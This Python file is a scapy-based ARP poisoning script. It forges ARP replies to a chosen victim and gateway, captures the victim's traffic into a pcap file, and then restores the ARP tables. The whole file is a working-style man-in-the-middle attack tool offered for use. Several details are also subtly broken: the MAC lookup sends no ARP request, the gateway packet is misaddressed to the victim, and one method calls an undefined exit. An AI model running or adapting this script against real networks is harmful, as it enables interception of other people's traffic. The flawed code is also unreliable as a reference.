"""
Author: Aleksa Zatezalo
Date: May 22th 2023
Description: An arp poisioning tool coded in python.
"""

from multiprocessing import Process
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap)

import os
import sys
import time

def get_mac(target_ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None

class Arper:
    def __init__(self, victim, gateway, interface='en0'):
        self.victim = victim
        self.victimmac = get_mac(victim)
        self.gateway = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface = interface
        conf.iface = interface
        conf.verb = 0

        print(f'Initialized {interface}:')
        print(f'Gateway ({gateway} is set at {self.gatewaymac}.)')
        print(f'Victim ({victim}) is at {self.victim}.')
        print('-' * 30)

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victem = ARP()
        poison_victem.op = 2
        poison_victem.psrc = self.gateway
        poison_victem.pdst = self.victim
        poison_victem.hwdst = self.victimmac
        print(f'ip src: {poison_victem.psrc}')
        print(f'ip dst: {poison_victem.pdst}')
        print(f'mac dst: {poison_victem.hwdst}')
        print(f'mac src: {poison_victem.hwsrc}')
        print(poison_victem.summary())
        print('-' * 30)

        poison_gateway = ARP()
        poison_gateway.op = 2
        poison_gateway.psrc = self.victim
        poison_gateway.pdst = self.gateway
        poison_gateway.pdst = self.victim
        poison_gateway.hwdst = self.victimmac
        print(f'ip src: {poison_gateway.psrc}')
        print(f'ip dst: {poison_gateway.pdst}')
        print(f'mac dst: {poison_gateway.hwdst}')
        print(f'mac src: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)

        print(f'Beginning the Arp Poison. [CTRL-C to stop]')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victem)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                self.exit()
            else:
                time.sleep(2)

    def sniff(self, count=200):
        time.sleep(5)
        print(f'Sniffing {count} packets')
        bpf_filter = "ip host %s" %victim
        packets = sniff(count=count, filter=bpf_filter)
        wrpcap('arper.pcap', packets)
        print('Got the packets')
        self.restore()
        self.poison_thread.terminate()
        print('Finished.')

    def restore(self):
        print('Restoring Arp Tables...')
        send(ARP(
            op=2,
            psrc=self.gateway,
            hwsrc=self.gatewaymac,
            pdst=self.victim,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count = 5)
        send(ARP(
            op=2,
            psrc=self.victim,
            hwsrc=self.victimmac,
            pdst=self.gateway,
            hwdst='ff:ff:ff:ff:ff:ff'),
            count=5)

if __name__ == '__main__':
    (victim, gateway, interface) = (sys.argv[1], sys.argv[2], sys.argv[3])
    myarp = Arper(victim, gateway, interface)
    myarp.run()